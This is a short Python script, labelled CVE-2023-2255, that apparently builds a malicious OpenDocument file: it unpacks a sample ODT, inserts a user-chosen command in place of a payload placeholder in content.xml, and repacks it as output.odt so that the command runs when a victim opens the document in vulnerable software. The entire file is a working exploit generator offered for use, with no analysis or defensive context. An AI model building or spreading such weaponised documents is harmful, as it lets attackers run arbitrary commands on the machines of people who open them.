import os
import sys
import urllib.parse
import zipfile
import argparse


def main():
    parser = argparse.ArgumentParser(description="CVE-2023-2255")
    parser.add_argument("--cmd", required=True, help="Command to execute")
    parser.add_argument("--output", default="output.odt", help="Output filename")
    args = parser.parse_args()

    with zipfile.ZipFile("./samples/test.odt", "r") as zip_ref:
        zip_ref.extractall("./tmp/")

    content_file = "./tmp/content.xml"
    with open(content_file, "r") as file:
        content = file.read()

    payload = args.cmd.replace(" ", "%20")
    new_content = content.replace("%PAYLOAD%", payload)

    with open(content_file, "w") as file:
        file.write(new_content)

    output_file = args.output
    with zipfile.ZipFile(output_file, "w") as zip_ref:
        for root, _, files in os.walk("./tmp/"):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = file_path.replace("./tmp/", "")
                zip_ref.write(file_path, arcname)

    for root, dirs, files in os.walk("./tmp/", topdown=False):
        for file in files:
            os.remove(os.path.join(root, file))
        for dir in dirs:
            os.rmdir(os.path.join(root, dir))
    os.rmdir("./tmp/")

    print(f"File {output_file} has been created !")


if __name__ == "__main__":
    main()
